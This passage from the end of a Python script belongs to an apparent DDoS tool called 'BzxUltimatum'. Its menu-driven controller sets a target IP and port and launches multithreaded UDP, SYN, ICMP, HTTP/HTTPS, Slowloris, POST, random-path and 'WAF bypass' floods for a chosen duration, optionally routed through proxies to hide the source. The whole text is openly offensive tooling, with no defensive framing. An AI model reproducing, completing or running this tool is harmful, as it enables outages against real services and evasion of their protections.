        print(f"{C}══════════════════════════════════════════════════════════{RS}")
        input(f"\n{Y}Press Enter...{RS}")
        
    def set_attack_method(self, method_num, method_name, method_func):
        self.attack_method = method_num
        self.attack_name = method_name
        self.attack_func = method_func
        print(f"{G}[✓] Attack method set to: {method_name}{RS}")
        time.sleep(0.5)
        
    def start_attack(self):
        if not self.target_ip:
            print(f"{R}[!] Set target dulu!{RS}")
            time.sleep(1)
            return
            
        if self.running:
            print(f"{Y}[!] Attack already running{RS}")
            time.sleep(1)
            return
            
        if not self.attack_func:
            print(f"{R}[!] Pilih attack method dulu!{RS}")
            time.sleep(1)
            return
            
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.requests_sent = 0
        self.failed_attempts = 0
        self.start_time = time.time()
        
        # Start threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_func)
            t.daemon = True
            t.start()
            threads.append(t)
            
        print(f"\n{R}[🔥] ULTIMATUM STARTED on {self.target_ip}:{self.target_port}{RS}")
        print(f"{Y}[*] Method: {self.attack_name}{RS}")
        print(f"{Y}[*] Threads: {self.threads} | Duration: {self.duration}s{RS}")
        if self.use_proxy:
            print(f"{G}[*] Using {len(self.proxy_manager.live_proxies)} live proxies{RS}")
            
        # Monitor duration
        try:
            while self.running and (time.time() - self.start_time) < self.duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Attack interrupted by user{RS}")
        finally:
            self.stop_attack()
            
    def stop_attack(self):
        self.running = False
        elapsed = time.time() - self.start_time
        print(f"\n\n{G}[✓] ULTIMATUM STOPPED{RS}")
        print(f"{G}[✓] Duration: {elapsed:.1f} seconds{RS}")
        print(f"{G}[✓] Total packets/requests: {self.packets_sent + self.requests_sent}{RS}")
        print(f"{G}[✓] Total bandwidth: {self.bytes_sent/1024/1024:.2f} MB{RS}")
        time.sleep(2)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    ultimatum = BzxUltimatum()
    
    # Map menu ke attack methods
    attack_methods = {
        '7': ('UDP Flood (Layer 4)', ultimatum.udp_flood),
        '15': ('SYN Flood (Layer 4)', ultimatum.syn_flood),
        '16': ('ICMP Flood (Layer 3)', ultimatum.icmp_flood),
        '8': ('HTTP Flood (Layer 7)', ultimatum.http_flood),
        '9': ('HTTPS Flood (Layer 7)', ultimatum.https_flood),
        '10': ('Slowloris (Layer 7)', ultimatum.slowloris),
        '11': ('POST Flood (Layer 7)', ultimatum.post_flood),
        '12': ('Random Path Flood (Layer 7)', ultimatum.random_path_flood),
        '13': ('WAF Bypass Mode (Layer 7)', ultimatum.waf_bypass_flood),
        '14': ('MIXED MODE (All Attacks)', ultimatum.mixed_mode),
    }
    
    while True:
        ultimatum.print_menu()
        choice = input(f"\n{Y}Pilih menu [0-19]: {RS}").strip()
        
        if choice == '1':
            ultimatum.set_target()
        elif choice == '2':
            ultimatum.set_port()
        elif choice == '3':
            ultimatum.set_threads()
        elif choice == '4':
            ultimatum.set_duration()
        elif choice == '5':
            ultimatum.set_delay()
        elif choice == '6':
            ultimatum.proxy_menu()
        elif choice in attack_methods:
            name, func = attack_methods[choice]
            ultimatum.attack_name = name
            ultimatum.attack_func = func
            print(f"{G}[✓] Attack method set to: {name}{RS}")
            time.sleep(0.5)
        elif choice == '17':
            ultimatum.show_config()
        elif choice == '18':
            ultimatum.start_attack()
        elif choice == '19':
            ultimatum.stop_attack()
        elif choice == '0':
            print(f"{R}[!] Exiting...{RS}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] User interrupt{RS}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{RS}")
